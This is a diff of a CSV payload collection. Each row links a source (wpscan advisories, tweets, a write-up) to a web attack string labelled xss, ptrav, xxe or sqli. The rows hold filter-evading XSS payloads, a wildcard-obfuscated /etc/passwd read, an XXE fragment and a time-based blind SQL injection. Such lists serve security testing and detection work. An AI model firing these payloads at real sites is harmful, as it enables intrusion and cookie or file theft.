@@ -458,7 +458,7 @@ https://wpscan.com/vulnerability/6cedb27f-6140-4cba-836f-63de98e521bf,%3Cscript%
 https://twitter.com/0SPwn/status/1651740036717576195,"""><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>Click</a>",xss
 https://twitter.com/0x0SojalSec/status/1653830922679250944,/???/???/c?t$IFS/???/p?s?w?,ptrav
 https://twitter.com/gdprAI/status/1653160069109026816,"<!DOCTYPE foo [<!ENTITY % a ""&#x3c;&#x21; ... omitted ...", xxe
-https://wpscan.com/vulnerability/c5e395f8-257e-49eb-afbd-9c1e26045373,"{"sku":"a\" AND (SELECT 42 FROM (SELECT(SLEEP(5)))wlHd)-- pOeU""}",sqli
+https://wpscan.com/vulnerability/c5e395f8-257e-49eb-afbd-9c1e26045373,{"sku":"a\" AND (SELECT 42 FROM (SELECT(SLEEP(5)))wlHd)-- pOeU""},sqli
 https://twitter.com/ShawarkOFFICIAL/status/1656050953660043265,"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">,xss
 https://medium.com/@lopseg/bug-bounty-writeup-stored-xss-vulnerability-waf-bypass-f38aae7ff9eb,<a href="http://example.com;" onmouseover="z=top;z[/al/.source%2b/ert/.source](8);//test.com/",xss
 https://twitter.com/ClumsyLulz/status/1659625523943751702,<svg>on%20onload%3D(“XSS”)(document.domain)<%2Fsvg>,xss
